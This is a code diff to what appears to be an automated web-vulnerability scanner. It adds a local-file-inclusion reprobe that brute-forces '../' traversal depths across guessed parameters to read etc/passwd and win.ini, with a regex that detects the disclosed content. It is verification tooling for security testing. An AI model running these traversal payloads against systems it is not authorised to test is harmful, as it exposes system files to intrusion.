@@ -56,6 +56,30 @@ const EXEC_LIKE_PATH = /\b(execute|terminal|shell|command|cmd|run|exec)\b/i;
 // wfuzz never populated) — used to seed the nonce-echo RCE oracle below.
 const EXEC_PARAM_NAMES = ["command", "cmd", "input", "shell", "exec", "run"];
 
+// Path/name signal that an unclassified "hidden_endpoints" finding is actually
+// a file-serving/inclusion sink misfiled by discovery — a "download an
+// attachment by id/path" endpoint accepts arbitrary relative paths with no
+// `..` sanitization far more often than the root URL tech-payload-prober.ts's
+// probeLfi() actually tests (it only ever probes this.state.targetUrl, never
+// a hidden endpoint ffuf discovers later), so a genuine LFI sink at e.g.
+// /api/support/attachment?file=... previously got zero traversal attempts at
+// all, at any depth.
+const LFI_LIKE_PATH = /\b(attachment|download|export|report|template|include|preview|view|doc|document|file|serve|asset|resource)\b/i;
+// Same param-name candidates tech-payload-prober.ts's LFI oracle uses — kept
+// as an independent local list by the same convention already established
+// for LFI_DISCLOSURE_SIGNATURE below (each prober owns its own oracle).
+const LFI_PARAM_NAMES = ["file", "path", "page", "template", "include", "doc", "filename", "document", "view", "dir"];
+// Traversal depths to brute-force per candidate param — covers the common
+// framework-specific depths tech-payload-selector.ts already knows about
+// (Node/Express: 3, PHP: 2) plus headroom either side, without turning this
+// into an unbounded scan; the loop below returns on the first real hit.
+const LFI_TRAVERSAL_DEPTHS = [1, 2, 3, 4, 5, 6, 8];
+// Same canonical file-disclosure signature the generic LFI branch below and
+// tech-payload-prober.ts's probeLfi() both trust — real content, never a
+// bare status code.
+const LFI_DISCLOSURE_SIGNATURE =
+  /root:.*:0:0:|(?:daemon|bin|sys|nobody):[^:]*:\d+:\d+:|\[(?:fonts|extensions|mci extensions)\]|for 16-bit app support/i;
+
 export interface VerificationResult {
   findingId: string;
   layer1_dedup: { isDuplicate: boolean; existingHash?: string };
@@ -252,6 +276,21 @@ export class Layer2Reprobe {
       // generic bare-GET check rather than silently no-op'ing the reprobe.
     }
 
+    // Same discovery-vs-verification gap as the two branches above, for LFI:
+    // tech-payload-prober.ts's probeLfi() only ever tests this.state.targetUrl
+    // (the site root) during OBSERVE — it never re-tests a hidden endpoint
+    // ffuf discovers later, so a real file-serving sink at e.g.
+    // /api/support/attachment?file=... got zero traversal attempts at any
+    // depth. Brute-force the standard depths/param names directly against
+    // THIS endpoint instead of a bare GET that can't see it at all.
+    if ((result.vulnClass as string) === "hidden_endpoints" && LFI_LIKE_PATH.test(reprobeUrl)) {
+      const lfiProof = await this.reprobeLfiTraversal(reprobeUrl, result.authHeaders, LFI_PARAM_NAMES);
+      if (lfiProof.confirmed) return lfiProof;
+      // No traversal signature observed — fall through to the generic check
+      // below so a file-shaped path that isn't actually a traversal sink
+      // still gets a normal verdict instead of being stuck on this result.
+    }
+
     try {
       const { default: axios } = await import("axios");
       const resp = await axios.get(reprobeUrl, {
@@ -364,6 +403,66 @@ export class Layer2Reprobe {
     }
 
     return { confirmed: false, statusCode: 0, responseSnippet: "Nonce echo not observed in any variant/parameter" };
+  }
+
+  /**
+   * Read-only LFI proof — traversal-depth brute force. A file-serving/
+   * inclusion endpoint (attachment download, template include, doc viewer…)
+   * gets tested with the standard `../` depths across candidate param names,
+   * confirming ONLY on the same canonical file-disclosure signature the
+   * generic LFI branch and tech-payload-prober.ts both trust (real content —
+   * a passwd/win.ini fragment — never a bare status code). Non-destructive:
+   * every request is a GET reading a well-known, world-readable file.
+   * Bounded to depths×params and returns on the first real hit, so a genuine
+   * sink resolves in a handful of requests despite the nested loop.
+   */
+  private async reprobeLfiTraversal(
+    reprobeUrl: string,
+    authHeaders?: Record<string, string>,
+    guessParams: string[] = [],
+  ): Promise<{ confirmed: boolean; statusCode: number; responseSnippet: string }> {
+    let url: URL;
+    try {
+      url = new URL(reprobeUrl);
+    } catch {
+      return { confirmed: false, statusCode: 0, responseSnippet: "Invalid URL" };
+    }
+
+    const params = Array.from(url.searchParams.keys());
+    const candidateParams = params.length > 0 ? params : guessParams;
+    if (candidateParams.length === 0) {
+      return { confirmed: false, statusCode: 0, responseSnippet: "No injectable parameter for traversal probe" };
+    }
+
+    const { default: axios } = await import("axios");
+    for (const depth of LFI_TRAVERSAL_DEPTHS) {
+      const prefix = "../".repeat(depth);
+      for (const param of candidateParams) {
+        for (const target of ["etc/passwd", "windows/win.ini"]) {
+          const probeUrl = new URL(url.toString());
+          probeUrl.searchParams.set(param, `${prefix}${target}`);
+          try {
+            const resp = await axios.get(probeUrl.toString(), {
+              timeout: 8000,
+              validateStatus: () => true,
+              headers: { "User-Agent": getRandomUserAgent(), ...authHeaders },
+            });
+            const body = typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data);
+            if (LFI_DISCLOSURE_SIGNATURE.test(body)) {
+              return {
+                confirmed: true,
+                statusCode: resp.status,
+                responseSnippet: `LFI confirmed via traversal (param="${param}", depth=${depth}, target="${target}"): ${body.slice(0, 300)}`,
+              };
+            }
+          } catch {
+            // Try the next depth/param/target — a single failed request isn't a verdict.
+          }
+        }
+      }
+    }
+
+    return { confirmed: false, statusCode: 0, responseSnippet: "No file-disclosure signature observed at any depth/parameter" };
   }
 }
 
